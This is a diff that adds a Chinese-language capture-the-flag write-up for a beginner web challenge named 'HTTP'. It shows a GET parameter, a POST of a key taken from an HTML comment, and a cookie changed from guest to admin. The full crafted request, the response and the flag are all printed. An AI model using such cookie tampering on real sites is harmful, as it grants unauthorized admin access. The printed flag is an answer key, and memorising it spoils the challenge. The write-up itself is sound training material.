@@ -725,7 +725,58 @@ Disallow:
 
 ------
 
-#### 
+### HTTP
+
+进入靶机后看到：
+
+> Please `GET` me your `name`,I will tell you more things.
+
+靶机`?name=Dad`
+
+> Hello,Dad. Please `POST` me the `key` Again.But Where is the key?
+
+可以在源码中看到<!--Key: ctfisgood-->，`Harkbar`构造`POST`请求，添加`key=ctfisgood`。
+
+> You are smart but you are not `admin`.
+
+`Burpsuite Pro`抓包，修改`Cookie`中的`guest`为`admin`，`send Repeater`以下内容：
+
+```
+POST /?name=flag HTTP/1.1
+Host: 6059b011-9e32-43f1-8a4d-41a07b7bed8d.node4.buuoj.cn:81
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: user=admin
+Connection: close
+Content-Length: 13
+Content-Type: application/x-www-form-urlencoded
+
+key=ctfisgood
+```
+
+可以在`Response`中看到以下信息：
+
+```
+HTTP/1.1 200 OK
+Server: openresty
+Date: Sat, 24 Sep 2022 04:09:24 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 74
+Connection: close
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.15
+
+<h1>OK, this is you want: flag{e695e63d-0489-4708-8695-730e7966731b}
+</h1>
+```
+
+提交`flag{e695e63d-0489-4708-8695-730e7966731b}`即可。
+
+------
 
 ## PwnTheBox
 
